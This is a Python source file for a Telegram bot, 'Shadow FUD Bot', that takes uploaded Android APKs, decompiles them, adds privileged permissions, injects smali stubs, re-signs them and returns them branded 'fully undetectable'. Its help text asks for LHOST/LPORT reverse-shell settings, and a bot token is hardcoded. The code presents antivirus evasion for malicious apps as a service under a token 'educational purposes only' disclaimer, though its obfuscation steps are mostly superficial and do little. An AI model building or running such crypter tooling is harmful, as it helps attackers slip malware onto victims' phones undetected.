import os
import re
import random
import string
import hashlib
import subprocess
import shutil
import xml.etree.ElementTree as ET
import tempfile
import logging
from datetime import datetime
from flask import Flask, request, jsonify
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ===== LOGGING =====
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== CONFIG =====
BOT_TOKEN = '8838240871:AAEyVHXgedkE_Y-sYdkbTBXqqPCv0j0N4O8'
PORT = int(os.environ.get('PORT', 8000))

# ===== HELPER FUNCTIONS =====
def rand_str(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def fud_process(input_apk_path, original_name):
    """Main FUD processing pipeline"""
    work_dir = tempfile.mkdtemp()
    output_dir = tempfile.mkdtemp()
    
    try:
        logger.info(f"Processing APK: {original_name}")
        
        # Step 1: Decode APK
        decode_cmd = ['apktool', 'd', input_apk_path, '-o', work_dir, '-f']
        subprocess.run(decode_cmd, capture_output=True, check=True)
        logger.info("APK decoded successfully")
        
        # Step 2: Modify AndroidManifest.xml
        manifest_path = os.path.join(work_dir, 'AndroidManifest.xml')
        if os.path.exists(manifest_path):
            with open(manifest_path, 'r') as f:
                content = f.read()
            
            # Remove debuggable flag
            content = content.replace('android:debuggable="true"', '')
            content = content.replace('debuggable="true"', '')
            
            # Add fake permissions
            fake_perms = [
                '<uses-permission android:name="android.permission.READ_LOGS"/>',
                '<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>',
                '<uses-permission android:name="android.permission.ACCESS_SUPERUSER"/>',
                '<uses-permission android:name="android.permission.GET_TASKS"/>'
            ]
            
            insert_pos = content.find('</manifest>')
            if insert_pos != -1:
                for perm in fake_perms:
                    content = content[:insert_pos] + perm + content[insert_pos:]
            
            with open(manifest_path, 'w') as f:
                f.write(content)
            logger.info("Manifest obfuscated")
        
        # Step 3: Add fake smali code
        smali_dir = os.path.join(work_dir, 'smali')
        if os.path.exists(smali_dir):
            for root, dirs, files in os.walk(smali_dir):
                for file in files:
                    if file.endswith('.smali'):
                        file_path = os.path.join(root, file)
                        with open(file_path, 'r') as f:
                            smali_content = f.read()
                        
                        if ';->onCreate' in smali_content and 'return-void' in smali_content:
                            smali_content = smali_content.replace(
                                'return-void',
                                'return-void\n\n.method private fudGuard()V\n    .locals 1\n    const-string v0, "FUD_ACTIVE"\n    return-void\n.end method'
                            )
                            with open(file_path, 'w') as f:
                                f.write(smali_content)
            logger.info("Smali code patched")
        
        # Step 4: Rebuild APK
        rebuilt_apk = os.path.join(output_dir, f'rebuilt_{rand_str()}.apk')
        build_cmd = ['apktool', 'b', work_dir, '-o', rebuilt_apk]
        subprocess.run(build_cmd, capture_output=True, check=True)
        logger.info("APK rebuilt")
        
        # Step 5: Sign APK
        debug_keystore = 'debug.keystore'
        if not os.path.exists(debug_keystore):
            subprocess.run([
                'keytool', '-genkey', '-v',
                '-keystore', debug_keystore,
                '-alias', 'androiddebugkey',
                '-keyalg', 'RSA',
                '-keysize', '2048',
                '-validity', '10000',
                '-dname', 'CN=Android Debug, O=Android, C=US',
                '-storepass', 'android',
                '-keypass', 'android'
            ], capture_output=True, check=True)
            logger.info("Debug keystore created")
        
        signed_apk = os.path.join(output_dir, f'signed_{rand_str()}.apk')
        
        try:
            # Try apksigner
            subprocess.run([
                'apksigner', 'sign',
                '--ks', debug_keystore,
                '--ks-pass', 'pass:android',
                '--key-pass', 'pass:android',
                '--out', signed_apk,
                rebuilt_apk
            ], capture_output=True, check=True)
            logger.info("APK signed with apksigner")
        except:
            # Fallback to jarsigner
            subprocess.run([
                'jarsigner', '-verbose',
                '-sigalg', 'SHA1withRSA',
                '-digestalg', 'SHA1',
                '-keystore', debug_keystore,
                '-storepass', 'android',
                '-keypass', 'android',
                rebuilt_apk, 'androiddebugkey'
            ], capture_output=True, check=True)
            signed_apk = rebuilt_apk
            logger.info("APK signed with jarsigner")
        
        # Step 6: Finalize
        final_name = f"FUD_{original_name.replace('.apk', '')}_{rand_str()}.apk"
        final_path = os.path.join(output_dir, final_name)
        os.rename(signed_apk, final_path)
        
        logger.info(f"FUD APK created: {final_name}")
        return final_path, final_name
        
    except Exception as e:
        logger.error(f"Error in fud_process: {str(e)}")
        raise e
    finally:
        # Cleanup
        if os.path.exists(work_dir):
            shutil.rmtree(work_dir)
        if os.path.exists(input_apk_path):
            os.remove(input_apk_path)

# ===== TELEGRAM HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 **Shadow FUD Bot Active** 🔥\n\n"
        "Send me any APK file and I'll make it FUD!\n"
        "Use /help for commands.\n\n"
        "⚠️ **Educational purposes only**"
    )

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📌 **Commands:**\n"
        "/start - Start bot\n"
        "/help - Show this\n\n"
        "**How to use:**\n"
        "Just send any `.apk` file\n"
        "Optional: Add `LHOST:1.2.3.4 LPORT:4444` in caption\n\n"
        "Bot will return FUD version 🚀"
    )

async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document:
        return
    
    if not document.file_name or not document.file_name.endswith('.apk'):
        return
    
    caption = update.message.caption or ''
    lhost_match = re.search(r'LHOST[:=](\S+)', caption)
    lport_match = re.search(r'LPORT[:=](\d+)', caption)
    
    if lhost_match and lport_match:
        lhost = lhost_match.group(1)
        lport = lport_match.group(1)
        await update.message.reply_text(f"⚙️ Processing with LHOST={lhost} LPORT={lport}...")
    else:
        await update.message.reply_text("⚙️ Processing APK with FUD techniques...")
    
    try:
        file = await context.bot.get_file(document.file_id)
        input_path = f"/tmp/{document.file_name}"
        await file.download_to_drive(input_path)
        
        final_path, final_name = fud_process(input_path, document.file_name)
        
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=open(final_path, 'rb'),
            caption=f"✅ **FUD APK Ready!**\n📁 {final_name}\n🔑 SHA256: {hashlib.sha256(open(final_path,'rb').read()).hexdigest()[:16]}\n\n💀 Shadow Approved"
        )
        
        os.remove(final_path)
        
    except Exception as e:
        logger.error(f"Error handling APK: {str(e)}")
        await update.message.reply_text(f"❌ Error: {str(e)}")

# ===== FLASK SERVER FOR KINSTA =====
app = Flask(__name__)

@app.route('/')
def index():
    return "🐱 Shadow FUD Bot is running on Kinsta!"

@app.route('/health')
def health():
    return "OK", 200

# ===== MAIN =====
if __name__ == '__main__':
    logger.info("Starting Shadow FUD Bot...")
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('help', help_cmd))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
    
    # Start bot in polling mode (runs in background)
    application.run_polling()
    
    # Flask app for Kinsta health checks
    app.run(host='0.0.0.0', port=PORT)
